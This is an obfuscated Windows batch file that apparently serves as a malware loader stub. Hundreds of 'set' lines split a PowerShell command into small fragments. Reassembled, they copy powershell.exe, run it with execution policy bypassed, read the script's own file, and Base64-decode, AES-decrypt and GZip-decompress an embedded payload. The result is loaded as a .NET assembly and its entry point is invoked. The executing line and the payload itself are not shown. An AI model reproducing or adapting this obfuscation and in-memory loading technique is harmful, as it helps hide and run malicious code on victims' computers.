@echo off
set "OCHWYhwrYu=in"
set "nbSLXMiptC=nd"
set "tNAhZblNNP=rS"
set "iXDbPVgyYc= /"
set "GgFKSxWuDe=1."
set "ThIwfSUtzZ=Po"
set "PPRKPTeFvU=we"
set "ktAfourXvg=co"
set "IuMAlHLhbt=he"
set "TNnMYvDNEa=\W"
set "gxkkLLVukf= C"
set "vXIkRzogNK=Sy"
set "pLNTbwxcez=py"
set "shfeiPCSLi=y "
set "BPFacJxmPW=0\"
set "vBpygCoCyf=32"
set "aMqTijaOrQ=ws"
set "WoAqlxUnwU=em"
set "AhRLxFIGVz=:\"
set "OQgEodrGZV=s\"
set "zWNqFiUbwv=ow"
set "flIjpLYUki=ll"
set "fWDeBTdtxd=we"
set "gHqowgHBwd=\v"
set "xbyYLvdqzi=xe"
set "gIZiAwrnOw=he"
set "xsntaopPZc=st"
set "kcfElQqXMa=Wi"
set "hPInOqbqmN=rs"
set "aJpnsdjmrp=ll"
set "FSRUOcqiJs=.e"
set "SZvyIzrKLu=po"
set "EaKTpVcPmx=do"
set "bfjtivKtLA=cd"
set "QgmoDTppwg= %~dp0"
set "DvhsDOdwzx=$CaB"
set "oDgoWiYImh=)))"
set "dKSUQSxlIb=6esa"
set "LDMddrtUPM=ress"
set "ptwduSjXSY=3); "
set "eAopkPFzDf=rity"
set "GFpuHHaJrw=.-16"
set "sWqPKsKNvl=ewLi"
set "umLSDKNScx=, (,"
set "kDIZwhRAQc=tem."
set "qJsInMZQwj=.Dis"
set "QMwtHdjyeA=::('"
set "AehRaRPalx=Syst"
set "dbHrMcfOxp=ss -"
set "kIJdWaJfds=[Env"
set "EZVrqENaPR=V = "
set "pccZGLKKgg=ispo"
set "utdqBzBsSR=n ''"
set "aAVJaGATWN=);$Y"
set "rXlPCvkVqL=[Sys"
set "fRnRxuKCwv=yste"
set "SgDLMtRcKE=raph"
set "IslcxuTZkb=zuZI"
set "zHZVjxNwlo=embl"
set "XbahHNcHUw=YVLo"
set "HJxNcQGDPI=b = "
set "rDUIckPQRX=in $"
set "reOqNCPJJa=gYVL"
set "tIfcNAXZQw=yste"
set "oJkADOBAcW=-nop"
set "NjPTUdwuBB=YVLo"
set "kRQodiqabP===')"
set "kdNcvVVpVz=Fina"
set "eiiDqpJTyp=ect "
set "mTedIZJvQQ=();$"
set "OMuKrERvvZ=daeR"
set "AiQWjQKlDb=1..-"
set "majsmWVRyZ=stem"
set "AEEwJYymOW=s75K"
set "RcAgxLqwYC=$PMi"
set "EhvzpKVQfi=bstr"
set "nCGrUauBlc=n ''"
set "meUqzRgcLJ=('Tg"
set "AwClsUygUQ=l5E7"
set "UKDTouOBEW=pStr"
set "saJpoRTzUS=RNw "
set "uipOZVDkTP=jU);"
set "kpMNWSuYKT=-joi"
set "xlQSiYRUkP=1] -"
set "VSYRKjWGRf=k; }"
set "gdkLxMivVi=Star"
set "sjCGhjJcwt=y.Cr"
set "fcSLABtiLS=cPH."
set "ELpDmrqQen= = $"
set "lsWZdBzLFr=EjmZ"
set "HlDvcodEeV=le  "
set "MIwcnQrOsw=] -j"
set "YiFMsElKMk=($tO"
set "TnuhMkNdmC=ode]"
set "QxQDgXsoQN=brea"
set "vAlUiGtkEz=pher"
set "EZPkPHXkBi=nage"
set "lSMFRqlxhh=w.En"
set "LmECutTwEb='txe"
set "dztacUkwKB='0Pg"
set "BbTjmgDozD=stem"
set "JBpgtovwFK=t Sy"
set "nrDJtdpejd=em.I"
set "Vjhejcntcq=null"
set "heSuOjPSGQ=e]::"
set "fSJXEyiSOA=Xkd."
set "kClJzaqQYQ=bjec"
set "GjxmGkMvVd=);$L"
set "LVVIRzFfop=flec"
set "pQMzcFRQeY=[Sys"
set "aOTzWAzVLO=m.IO"
set "VfhxsXkdsZ=HQ.T"
set "wjbzxZdXfo=);$g"
set "iHlPvvMRtH=eam("
set "qNFDcWyNAd=o.Pa"
set "wygdLKWFWp=ptog"
set "ypLlYlzKZw=rt]:"
set "yQPedRmxKx=('da"
set "sNczRcbthh=).Sp"
set "TunSYnqqAS=YVLo"
set "ZmBozBIKGa=();$"
set "rxlwlcjHDw=Disp"
set "sruxJswZui=saBm"
set "BjlfaFzjZP=;$PM"
set "xbqvcxByVo=ypto"
set "FNeUDpBeQo=Invo"
set "xgzKsFKRjo=trea"
set "uyapkeSOBZ=zFmK"
set "LnNnvrkMsz=iHQ "
set "ISPclDKsJb=hy.A"
set "rIXPCviADr=.GZi"
set "yXnzklRnac=ress"
set "pgcvAZmDjb=ptor"
set "PbWzHkLsex=; };"
set "cDaGAOyGTA=jU.T"
set "djJnbOkyQr=, $E"
set "miiaBRdQTt=();$"
set "jMWzMOeltt=ach "
set "wmQIOtyDoF=File"
set "RFJgpdEunt=Obje"
set "sEWEJzkDdn=L4Yi"
set "lmmuIMEzkm=Stre"
set "dUfKHKosPG=raph"
set "MSeOCeSkMA=H = "
set "WxDAXqLaMA== $g"
set "OWcDzwgeYM=.IO."
set "wQODVbDrKs=)) {"
set "BYXhsKRKiK=$Ejm"
set "IqhVMWjmIP=Comp"
set "lhlJJaRyIK= New"
set "IWjWnrimwo=EjmZ"
set "NlRmxLNxTZ=..-1"
set "AGbFSnrpQF=Secu"
set "nreWXlZDtZ=.Key"
set "byIlTGogWC=CBZ "
set "dspsOMMbRg=Disp"
set "ftyQZIcoDH=TllA"
set "cEEvdKNQAb=.Cop"
set "ttZwhRDIDZ=ct S"
set "HKlsfYlCvf=grap"
set "EVICvAgZhE==');"
set "qVZeylxxDv= [Sy"
set "yQkRPvOODU=ert]"
set "IapKnLmAiD=::De"
set "sgKoknnkSq=.Dis"
set "nAOcdVuLOA=$YiL"
set "uLsMxRcdJW=YVLo"
set "YbKUyeQluc=$YiL"
set "RbtbtvpgaL=106u"
set "fibaRbeWfH=A = "
set "IsocImZFaQ=Bmor"
set "WLqEMPIFrs=ne);"
set "hwqbvjKWeJ=-joi"
set "KxmXyJlwnf=iolt"
set "bcBuvwEoZn=$YiL"
set "URbUrJKLJR=g = "
set "ALtbiVwobX=onve"
set "TZzgcnDylS=yTo("
set "AhGXzqmHux=);$C"
set "zAXSajvUEJ=rans"
set "GVmPnGLHqa=jmZb"
set "JfrQJYoIIg=)($E"
set "TTaWPhxdhr=F'[-"
set "GStKoWsOgx= = N"
set "TSEjOrimRf=and "
set "MdXFGkomLo=m.IO"
set "jphkeAOjJx=jU ="
set "YqdqEWZEXr=bypa"
set "acMowSAmbT=b = "
set "BNbYCZCSCu=)($h"
set "JyXgIWQCGZ=yste"
set "FYArlyIkPA=$Eec"
set "TTIxYuhDHB=.Ass"
set "WxvnTaihfU=-1.."
set "DkkaZjxNnt=.Len"
set "rbyMQyQdhx=oL'["
set "ztZwMJfyyn=th('"
set "HNQSLNGhrI=ew-O"
set "dlUhBaoKuQ=('%*'"
set "vozRyIlHKw=lit("
set "ZoehNmQZJD=$gYV"
set "UiotGZihDZ=:('g"
set "BsXKEsrzmQ=y.Ci"
set "chbzUZbmvZ=[]] "
set "AYpRbquSjL= if "
set "FARAdoYWgm=e = "
set "PFDAwnBGAg=eMVs"
set "yhoBtcRReW=.Cry"
set "swtgUDJlCa=BC;$"
set "RYWDyKwhug=[IO."
set "YDHBSdGKhK=ateD"
set "NtNQdJRURr=-4] "
set "ukjcADwraS=oArr"
set "jtccpqQLED=ose("
set "CyHYjJqYHR=tS46"
set "USXsanpIqU=stem"
set "PUJquZCNpE=morF"
set "NzZqQVmygI=[Sys"
set "bobPfzlkPW=-ep "
set "ObbLfgbqSo=rtS4"
set "lMeZJQdXFK=ke($"
set "rjLocdkLMS=ddin"
set "fQYrVJUGBO=tion"
set "XMEbbkHnou='[-1"
set "bojKByglPc=YxVw"
set "ZmohUWXSRV== [S"
set "seOQvRctUE=em.C"
set "SYlqucKjPx=;$Ee"
set "CJSoNpgfAy=ose("
set "KuadMEcWxT=ment"
set "oyHMRaHJcc=$iol"
set "hCIcZoEZyk=join"
set "HKXIXYxwWl=zFmK"
set "ZRJuZgExjh=oryS"
set "UcStWAqRpZ=Syst"
set "MTjPvhvMZl=pose"
set "zcYmAjLoHz=..-1"
set "ZXlaqWeDSL=.Cre"
set "rqIIxgEvPJ=New-"
set "ThIRhpskzO=CaBK"
set "igpRPzpNam=7;$g"
set "aOZihMOikh= '')"
set "JtFwpRswyp=se()"
set "ZzgQBhYqur='')("
set "vMBIRJTTjq=.Mem"
set "TZCnbDcDUI=Mode"
set "ECDRdoIfJe=Obje"
set "ogYfbSYNEk=b, 0"
set "USLArdGOPQ=y]::"
set "iHnoITWRkg=ing("
set "fCDLhWKnZZ=gth)"
set "tSyXxfzVzV=dj0C"
set "jzOmyByIkn=]::("
set "JQDswUUTap=tryP"
set "oMlkvzHfjy=CdRN"
set "osnBgaYLxg=tsWi"
set "XIovQGcWSA=ion."
set "twMAkbUVwi=td ="
set "DHzYrSsXTD=[-1."
set "jUUxKtNKnO= [st"
set "fuBbOvNUxf=EjmZ"
set "WfzGGSYJnR=iHQ."
set "CjfGhAztzX=]::("
set "ylvNmnlSAh=ress"
set "PJRFIzmGIZ=gMod"
set "zpbwSJeZDR=]::N"
set "cAQIRBJsEe=Comp"
set "jDyPLLeLGg=d) {"
set "lMdIOpkljB=rity"
set "uEnRQDluoq=esMa"
set "UDJnmJuoIJ=PKCS"
set "SUbyZWWppZ=m(, "
set "wcDMwnLzqf=iron"
set "cexRKJEwAK= = $"
set "JHTKsecugM=rofi"
set "gXLlgwGwty=ddin"
set "UWqHPDezti=oint"
set "lqVRFVYToG=:: '"
set "ySMGMLZKMW=;$Ld"
set "gOhTHTPaGT=);$g"
set "VNetQclDch=Lo.I"
set "ZFJvbjNtyW=am;$"
set "xKIMnfzaYD=.Com"
set "MQofAIdFnE=.Mod"
set "rCsHiacLff=ionM"
set "NmZQkeGKkn=.Sec"
set "YgGrLEmojy=d;$g"
set "ulndFvGaKB=ring"
set "UFfLAswqTW=m.Re"
set "IxTcurfHfo=lBlo"
set "VtqkfyMLms=Secu"
set "yHstiEcwTJ= '')"
set "JfZdabnxSV=-Obj"
set "FQsusZgCZX=.Cry"
set "frxgYCQBrh=KA.D"
set "qYZskEYhci=mory"
set "SQoraIydDY=PH, "
set "ujwKjAiizR=comp"
set "qRPZBiRPBr=form"
set "FRdDQonRpm=Zb);"
set "ccLQCDfCrV=esaB"
set "QgYTAXTkYD=vert"
set "hGarVarSJV=pres"
set "fNNfyRIeZS=tOCB"
set "PtHQRMeOYO=  $h"
set "slygDhazpk=.Con"
set "fVKyUtsCkr=tem."
set "LXvhUvGeFT=comm"
set "eXYZQbObFo= = ["
set "zAPwmQQoLt=tem."
set "cXsqaUtDGz=$Ejm"
set "sbXRsFAAAH=sion"
set "RkUAYMTgFX=Z.Su"
set "MTmjmdIQmo=;$Cd"
set "FCPqNgyKzw=urit"
set "uRTRtOfeXr=CBZ."
set "TyxzuZVbQE=ecry"
set "TCOVBLWMSd=('%~f0'"
set "zyxfuLoDra=New-"
set "nqqOtdYHsu=O.Me"
set "NzcxueAvzs=]::C"
set "iBoPILMtBY=PxEW"
set "SOxMsreyjY='[-1"
set "hNYIAxHomw=CFxo"
set "sgGhOFuPBR=ay()"
set "ecPrAdtDSj=S46e"
set "ToBlWNYxJd=($tO"
set "CNVZRkCOni=RmAx"
set "YugaOjIRlb=nirt"
set "CxbFetOwPP=join"
set "NoKbYdiKwP=orF'"
set "qiBsVWzBuD=ptog"
set "pCWZZZtNRi=Conv"
set "Uuhkqturzv=YVLo"
set "NzowCkDZqQ=gnir"
set "BIbwkwuFtl=Zb ="
set "IMCxCyVSDP=gsYZ"
set "mykdfqzNok=EecP"
set "nTritvMZcS=16] "
set "qwSomepiWk=ck($"
set "eaHubIPqDk=6] -"
set "ykKGlzITBH=iLjU"
set "ppJOIfXVeY=dXkd"
set "KHDhRDxFrh=pose"
set "ihsIMfbVSg=y.Pa"
set "zvLEpvUJhD=PTtG"
set "kqGUUpAzah=gjYA"
set "NCDBKJQJYm=aBKA"
